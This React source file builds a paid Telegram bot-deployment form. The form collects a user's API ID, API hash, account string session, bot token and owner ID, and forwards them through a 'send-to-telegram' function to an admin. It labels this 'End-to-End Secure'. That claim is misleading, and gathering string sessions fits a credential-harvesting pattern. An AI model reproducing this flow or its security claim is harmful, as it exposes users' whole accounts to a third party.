import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Send, Key, Hash, Bot, User, Loader2, Info, ShieldCheck, Lock, ArrowRight, Sparkles } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

const formSchema = z.object({
  apiId: z.string().min(1, "API ID is required").regex(/^\d+$/, "API ID must be numeric"),
  apiHash: z.string().min(1, "API Hash is required").length(32, "API Hash must be 32 characters"),
  stringSession: z.string().min(1, "String Session is required").min(100, "String Session seems too short"),
  botToken: z.string().min(1, "Bot Token is required").regex(/^\d+:[A-Za-z0-9_-]+$/, "Invalid Bot Token format"),
  ownerId: z.string().min(1, "Owner ID is required").regex(/^\d+$/, "Owner ID must be numeric"),
  honeypot: z.string().optional(),
});

type FormData = z.infer<typeof formSchema>;

interface DeploymentFormProps {
  selectedPlan: "1month" | "2months" | null;
}

const DeploymentForm = ({ selectedPlan }: DeploymentFormProps) => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      apiId: "",
      apiHash: "",
      stringSession: "",
      botToken: "",
      ownerId: "",
      honeypot: "",
    },
  });

  const onSubmit = async (data: FormData) => {
    if (!selectedPlan) {
      toast({
        title: "Please select a plan",
        description: "Scroll up to choose your preferred plan before submitting.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const response = await supabase.functions.invoke('send-to-telegram', {
        body: {
          apiId: data.apiId,
          apiHash: data.apiHash,
          stringSession: data.stringSession,
          botToken: data.botToken,
          ownerId: data.ownerId,
          plan: selectedPlan,
          timestamp: Date.now(),
          honeypot: data.honeypot,
        },
      });

      if (response.error) {
        throw new Error(response.error.message || 'Failed to submit deployment request');
      }

      navigate('/success');
    } catch (error) {
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your request. Please try again or contact support.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const planInfo = {
    "1month": { name: "Starter", duration: "1 Month", price: "₹400" },
    "2months": { name: "Pro", duration: "2 Months", price: "₹600" },
  };

  const formFields = [
    {
      name: "apiId" as const,
      label: "API ID",
      icon: Hash,
      placeholder: "12345678",
      description: "Get from my.telegram.org",
    },
    {
      name: "apiHash" as const,
      label: "API Hash",
      icon: Key,
      placeholder: "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
      description: "32-character hash from my.telegram.org",
    },
    {
      name: "stringSession" as const,
      label: "String Session",
      icon: Send,
      placeholder: "Your Pyrogram/Telethon string session...",
      description: "Generated via Pyrogram or Telethon",
    },
    {
      name: "botToken" as const,
      label: "Bot Token",
      icon: Bot,
      placeholder: "123456789:ABCdefGHIjklMNOpqrSTUvwxYZ",
      description: "Get from @BotFather on Telegram",
    },
    {
      name: "ownerId" as const,
      label: "Owner ID",
      icon: User,
      placeholder: "123456789",
      description: "Your Telegram user ID (get from @userinfobot)",
    },
  ];

  return (
    <section id="deploy" className="relative z-10 py-24 px-4">
      {/* Background accents */}
      <div className="absolute top-1/3 right-0 w-96 h-96 bg-accent/10 rounded-full blur-[150px] -z-10" />
      <div className="absolute bottom-1/3 left-0 w-80 h-80 bg-primary/10 rounded-full blur-[120px] -z-10" />
      
      <div className="max-w-2xl mx-auto">
        {/* Security Badge */}
        <div className="glass rounded-2xl p-5 border-green-500/20 mb-8 animate-fade-up">
          <div className="flex items-start gap-4">
            <div className="flex-shrink-0 w-12 h-12 rounded-xl bg-green-500/10 flex items-center justify-center">
              <ShieldCheck className="w-6 h-6 text-green-400" />
            </div>
            <div>
              <h3 className="font-semibold text-green-400 mb-1 flex items-center gap-2">
                <Lock className="w-4 h-4" />
                End-to-End Secure
              </h3>
              <p className="text-muted-foreground text-sm leading-relaxed">
                Your credentials are transmitted via HTTPS and sent directly to our admin. 
                We never store your credentials on any server. Only share credentials for bots you own.
              </p>
            </div>
          </div>
        </div>

        <Card className="glass-strong border-border/30 overflow-hidden">
          {/* Gradient top border */}
          <div className="h-1 bg-gradient-to-r from-primary via-accent to-primary" />
          
          <CardHeader className="text-center pt-10 pb-6">
            {/* Icon */}
            <div className="mx-auto mb-6 relative">
              <div className="absolute inset-0 rounded-2xl blur-xl bg-primary/30 animate-pulse-slow" />
              <div className="relative glass-strong rounded-2xl p-5 glow-primary">
                <Bot className="w-10 h-10 text-primary" />
              </div>
            </div>
            
            <CardTitle className="text-3xl md:text-4xl mb-3">
              <span className="gradient-text">Deploy Your Bot</span>
            </CardTitle>
            
            <CardDescription className="text-base text-muted-foreground max-w-md mx-auto">
              Enter your Telegram credentials below. Your bot will be live within 30 minutes.
            </CardDescription>
            
            {/* Selected Plan Badge */}
            {selectedPlan && (
              <div className="mt-6 inline-flex items-center gap-3 glass rounded-xl px-5 py-3">
                <Sparkles className="w-4 h-4 text-accent" />
                <div className="text-left">
                  <span className="text-xs text-muted-foreground block">Selected Plan</span>
                  <span className="font-semibold text-primary">
                    {planInfo[selectedPlan].name} • {planInfo[selectedPlan].price}
                  </span>
                </div>
              </div>
            )}
          </CardHeader>

          <CardContent className="px-6 md:px-10 pb-10">
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
                {/* Honeypot field - hidden from users, catches bots */}
                <div className="absolute -left-[9999px]" aria-hidden="true">
                  <FormField
                    control={form.control}
                    name="honeypot"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Leave empty</FormLabel>
                        <FormControl>
                          <Input tabIndex={-1} autoComplete="off" {...field} />
                        </FormControl>
                      </FormItem>
                    )}
                  />
                </div>

                {formFields.map((fieldConfig, index) => (
                  <FormField
                    key={fieldConfig.name}
                    control={form.control}
                    name={fieldConfig.name}
                    render={({ field }) => (
                      <FormItem 
                        className="animate-fade-up"
                        style={{ animationDelay: `${index * 50}ms` }}
                      >
                        <FormLabel className="flex items-center gap-2 text-sm font-medium">
                          <fieldConfig.icon className="w-4 h-4 text-primary" />
                          {fieldConfig.label}
                        </FormLabel>
                        <FormControl>
                          <Input 
                            placeholder={fieldConfig.placeholder}
                            className="input-premium h-12 rounded-xl"
                            autoComplete="off"
                            {...field} 
                          />
                        </FormControl>
                        <FormDescription className="flex items-center gap-1.5 text-xs text-muted-foreground">
                          <Info className="w-3 h-3" />
                          {fieldConfig.description}
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                ))}

                <div className="pt-4">
                  <Button 
                    type="submit" 
                    disabled={isSubmitting || !selectedPlan}
                    size="lg"
                    className="w-full btn-premium text-primary-foreground font-semibold py-7 text-lg rounded-xl group disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span className="relative z-10 flex items-center justify-center gap-2">
                      {isSubmitting ? (
                        <>
                          <Loader2 className="w-5 h-5 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        <>
                          <Send className="w-5 h-5" />
                          Submit Deployment Request
                          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                        </>
                      )}
                    </span>
                  </Button>
                </div>

                {!selectedPlan && (
                  <p className="text-center text-amber-400 text-sm flex items-center justify-center gap-2">
                    <Info className="w-4 h-4" />
                    Please select a plan above before submitting
                  </p>
                )}
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
    </section>
  );
};

export default DeploymentForm;
